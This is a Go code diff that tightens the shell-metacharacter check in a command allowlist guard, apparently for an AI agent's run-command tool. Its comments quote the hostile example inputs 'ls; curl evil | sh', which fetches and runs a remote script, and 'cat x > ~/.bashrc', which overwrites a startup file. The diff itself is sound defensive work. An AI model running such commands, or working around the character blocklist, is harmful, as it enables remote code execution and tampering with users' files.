@@ -105,13 +105,18 @@ func (inv *Investigator) isCommandAllowed(command string) bool {
 		return false
 	}
 
-	// Reject shell chaining operators FIRST, before the empty-allowlist
+	// Reject shell metacharacters FIRST, before the empty-allowlist
 	// short-circuit. Otherwise a config with an explicitly empty
 	// command_allowlist would allow injection like "ls; curl evil | sh".
-	for _, ch := range []string{";", "&&", "||", "|", "$(", "`", "\n"} {
-		if strings.Contains(trimmed, ch) {
-			return false
-		}
+	//
+	// Use the SAME canonical set as the native runtime's run_command guard
+	// (runtime/gemma.go isCommandAllowed) so the two enforcement points can't
+	// drift. The old set only blocked chaining (; && || | $( ` \n) and left
+	// redirection (> <), background (&), bare variable expansion ($HOME), and
+	// \r \t \x00 \ open — so an allowlisted prefix like "cat" or "grep" could
+	// still clobber files outside the repo, e.g. `cat x > ~/.bashrc`.
+	if strings.ContainsAny(trimmed, ";&|$`<>\n\r\t\x00\\") {
+		return false
 	}
 
 	if len(inv.commandAllowlist) == 0 {
